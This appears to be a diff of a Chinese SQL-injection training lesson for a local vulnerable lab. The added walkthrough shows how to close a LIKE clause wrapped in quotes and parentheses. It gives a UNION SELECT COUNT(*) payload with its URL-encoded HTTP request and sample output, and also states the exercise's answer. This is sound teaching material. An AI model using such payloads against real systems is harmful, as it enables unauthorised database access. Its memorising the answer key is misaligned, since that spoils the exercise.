@@ -7,16 +7,16 @@ difficulty: practitioner
 
 ## 原理背景
 
-上一课的数字型注入不需要闭合任何东西，但真实业务的注入点常常被"包装"起来：
+上一课的数字型注入不需要闭合任何东西，但真实业务的注入点常常被"包装"起来。靶场的模糊查询接口 `GET /user/name/like/2`（注意路径末尾有 `/2`，这是**带括号版**；不带 `/2` 的 `/user/name/like` 没有括号和附加条件，不是本题注入点）拼出的 SQL 是：
 
 ```sql
-select * from vulin_users where (username LIKE '%<输入>%') and (age > 20)
+select * from vulin_users where (username LIKE '%<输入>%') and (age > 20);
 ```
 
 你的输入被夹在 `'%` 和 `%'` 之间，后面还有整段附加条件。注入 payload 必须：
 
 1. **闭合**左侧的引号与百分号（`a%'`）；
-2. 注入 UNION 查询；
+2. 注入 UNION 查询（上一课已探明 `vulin_users` 共 9 列）；
 3. **注释掉**尾部的 `') and (age > 20)`（`--` 后跟空格）。
 
 这层"拆包装纸"的功夫，是手工注入从入门到进阶的分水岭。
@@ -32,13 +32,56 @@ select * from vulin_users where (username LIKE '%<输入>%') and (age > 20)
 
 ## 开始实战
 
-点击 **前往配套题目练习**，启动环境后：
+点击 **前往配套题目练习**，启动环境后：对 `/user/name/like/2` 构造 `a%') UNION SELECT ...-- ` 形态的 payload（URL 编码后发送），先对齐 9 列，再把目标换成 `COUNT(*)` 统计查询——题目要求的是 `vulin_users` 表的**用户总数**，这个数字只能靠注入统计得到，提交响应里出现的数字。
 
-1. 观察 `/user/name/like?name=a` 的正常响应，确认注入点被 `'%...%'` 包裹、尾部还有 `(age > 20)`；
-2. 构造 `name=a%') UNION SELECT ...-- ` 形态的 payload（URL 编码后发送）：
-   - 先用 `UNION SELECT NULL,...` 对齐列数；
-   - 再换成统计查询（题目要求的是 `vulin_users` 表的**用户总数**，靶场每次启动会生成随机账号，数字必须现场注入统计）；
-3. 响应里的数字即答案。注意 `--` 后面留一个空格才能吞掉后面的条件。
+<details>
+<summary>📋 详细步骤（点击展开，照做即可拿到答案）</summary>
+
+以下以实例地址 `http://127.0.0.1:36870` 为例——**端口每次启动环境都随机分配，请替换成你题目页显示的端口**。
+
+**第 1 步：启动实验环境**
+
+题目详情页点「启动实验环境」，等状态 running，复制访问地址（形如 `http://127.0.0.1:36870`）。
+
+**第 2 步：观察正常响应，确认注入点形态**
+
+```http
+GET /user/name/like/2?name=a HTTP/1.1
+Host: 127.0.0.1:36870
+```
+
+返回 username 含 `a` 且年龄大于 20 的用户（如 admin）。此时你的输入正被包在 `'%a%'` 里——把参数换成 `name=x%27`（一个单引号）再发，响应变成没有用户数据的空页面：单引号破坏了 SQL 语法导致整条查询失败，这就是"输入被拼进语句"的直接证据。
+
+**第 3 步：构造闭合 + UNION 统计 payload**
+
+思路：`a%')` 闭合掉 `'%`，紧接 UNION 查 9 列（`COUNT(*)` 放在第 6 位对齐 `password` 列），最后 `-- ` 注释掉尾部条件。原始形态：
+
+```sql
+a%') UNION SELECT 1,2,3,4,5,COUNT(*),7,8,9 FROM vulin_users-- 
+```
+
+（`--` 后面留一个空格，才能吞掉后面的 `) and (age > 20)`。）整体 URL 编码后发送：
+
+```http
+GET /user/name/like/2?name=a%25%27)%20UNION%20SELECT%201,2,3,4,5,COUNT(*),7,8,9%20FROM%20vulin_users--%20 HTTP/1.1
+Host: 127.0.0.1:36870
+```
+
+**第 4 步：读取统计数字**
+
+响应 JSON 里会多出一行"假用户"，它的 `password` 字段（第 6 列对位）就是总数：
+
+```json
+[{"id":1,"password":26,"remake":9,"role":8,"username":5,...},{"id":1,"username":"admin",...}]
+```
+
+—— `password` 位置的 `26` 即 `vulin_users` 的用户总数（20 个随机生成的账号 + admin、root、user1 等预置账号）。第一行是 UNION 注入的结果（字段值全是占位数字），后面是原查询命中的真实用户，注意区分。
+
+**第 5 步：提交答案**
+
+回到题目详情页，提交 `26`。
+
+</details>
 
 ## 延伸：fuzztag 进阶
 
